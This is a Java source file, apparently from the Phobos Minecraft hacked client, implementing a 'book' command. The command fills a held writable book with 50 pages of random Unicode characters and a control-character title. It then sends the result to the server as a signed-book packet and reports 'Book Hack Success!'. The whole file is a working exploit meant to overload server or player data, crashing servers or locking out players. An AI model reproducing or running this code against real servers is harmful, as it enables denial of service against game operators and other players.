



package me.earth.phobos.features.command.commands;

import me.earth.phobos.features.command.*;
import net.minecraft.init.*;
import java.util.*;
import net.minecraft.nbt.*;
import io.netty.buffer.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import me.earth.phobos.*;
import net.minecraft.item.*;
import java.util.stream.*;

public class BookCommand extends Command
{
    public BookCommand() {
        super("book", new String[0]);
    }
    
    public void execute(final String[] commands) {
        final ItemStack heldItem = BookCommand.mc.player.getHeldItemMainhand();
        if (heldItem.getItem() == Items.WRITABLE_BOOK) {
            final Random rand = new Random();
            final IntStream characterGenerator = rand.ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            final String joinedPages = characterGenerator.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
            final NBTTagList pages = new NBTTagList();
            for (int page = 0; page < 50; ++page) {
                pages.appendTag((NBTBase)new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
            }
            if (heldItem.hasTagCompound()) {
                assert heldItem.getTagCompound() != null;
                heldItem.getTagCompound().setTag("pages", (NBTBase)pages);
            }
            else {
                heldItem.setTagInfo("pages", (NBTBase)pages);
            }
            final StringBuilder stackName = new StringBuilder();
            for (int i2 = 0; i2 < 16; ++i2) {
                stackName.append("\u0014\f");
            }
            heldItem.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            heldItem.setTagInfo("title", (NBTBase)new NBTTagString(stackName.toString()));
            final PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.writeItemStack(heldItem);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", buf));
            sendMessage(Phobos.commandManager.getPrefix() + "Book Hack Success!");
        }
        else {
            sendMessage(Phobos.commandManager.getPrefix() + "b1g 3rr0r!");
        }
    }
}
